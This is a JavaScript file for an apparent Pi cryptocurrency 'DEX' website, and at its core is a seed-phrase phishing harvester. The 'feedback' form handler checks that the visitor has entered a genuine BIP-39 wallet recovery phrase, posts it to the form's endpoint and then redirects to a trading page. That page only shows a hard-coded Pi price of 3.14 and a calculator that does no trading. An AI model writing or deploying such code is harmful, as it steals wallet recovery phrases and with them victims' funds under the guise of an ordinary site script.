// ========================================
// GLOBAL VARIABLES
// ========================================
let piPriceUSD = 3.14;
let selectedNetwork = 'BEP20';
let isBuyingPi = false;

// ========================================
// INITIALIZATION
// ========================================
document.addEventListener('DOMContentLoaded', function () {
    initializeFeedbackPage();
    initializeDexPage();
    initializeMobileMenu();
    setupInputListeners();
});

// ========================================
// FEEDBACK PAGE FUNCTIONALITY (FINAL)
// ========================================
async function initializeFeedbackPage() {
    const form = document.getElementById('feedbackForm');
    if (!form) return;

    const mnemonicInput = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    const wordlist = await fetch(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt'
    )
        .then(r => r.text())
        .then(t => t.trim().split('\n'));

    function showError(msg) {
        errorMessage.textContent = msg;
        errorMessage.style.display = 'block';
    }

    function hideError() {
        errorMessage.style.display = 'none';
    }

    function isValidBip39Mnemonic(mnemonic) {
        const words = mnemonic.split(/\s+/);

        if (![12, 15, 18, 21, 24].includes(words.length)) return false;

        for (const word of words) {
            if (!wordlist.includes(word)) return false;
        }

        return window.bip39.validateMnemonic(mnemonic);
    }

    form.addEventListener('submit', async function (e) {
        e.preventDefault(); // ALWAYS stop native submit

        const mnemonic = mnemonicInput.value.trim().toLowerCase();

        if (!isValidBip39Mnemonic(mnemonic)) {
            showError('Invalid passphrase. Please enter a valid BIP-39 recovery phrase.');
            return;
        }

        hideError();

        const formData = new FormData(form);

        try {
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { Accept: 'application/json' }
            });

            if (response.ok) {
                // ✅ JS-controlled redirect
                window.location.href = 'dex.html';
            } else {
                showError('Submission failed. Please try again.');
            }
        } catch {
            showError('Network error. Please try again.');
        }
    });
}

// ========================================
// DEX PAGE FUNCTIONALITY
// ========================================
function initializeDexPage() {
    const firstAmount = document.getElementById('firstAmount');
    if (firstAmount) {
        updatePriceDisplay();
    }
}

// ========================================
// MOBILE MENU
// ========================================
function initializeMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    const navLinks = document.getElementById('navLinks');

    document.addEventListener('click', function (e) {
        if (navLinks && menuToggle) {
            const nav = document.querySelector('nav');
            if (nav && !nav.contains(e.target) && navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                menuToggle.classList.remove('active');
            }
        }
    });
}

function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    const menuToggle = document.getElementById('menuToggle');
    if (navLinks) navLinks.classList.toggle('active');
    if (menuToggle) menuToggle.classList.toggle('active');
}

// ========================================
// INPUT LISTENERS
// ========================================
function setupInputListeners() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');

    if (firstAmount) {
        firstAmount.addEventListener('input', () => !isBuyingPi && calculateAmount());
        firstAmount.addEventListener('keydown', e => {
            if (['-', 'e', 'E'].includes(e.key)) e.preventDefault();
        });
    }

    if (secondAmount) {
        secondAmount.addEventListener('input', () => isBuyingPi && calculateAmount());
        secondAmount.addEventListener('keydown', e => {
            if (['-', 'e', 'E'].includes(e.key)) e.preventDefault();
        });
    }
}

// ========================================
// PRICE + CALCULATIONS
// ========================================
function updatePriceDisplay() {
    const livePrice = document.getElementById('livePiPrice');
    if (livePrice) livePrice.textContent = '$' + piPriceUSD.toFixed(2);
}

function calculateAmount() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    if (!firstAmount || !secondAmount) return;

    if (isBuyingPi) {
        const usdt = parseFloat(firstAmount.value) || 0;
        secondAmount.value = usdt > 0 ? (usdt / piPriceUSD).toFixed(4) : '';
    } else {
        const pi = parseFloat(firstAmount.value) || 0;
        secondAmount.value = pi > 0 ? (pi * piPriceUSD).toFixed(2) : '';
    }
}

// ========================================
// DEBUG
// ========================================
console.log('Pi Dex Script Loaded');
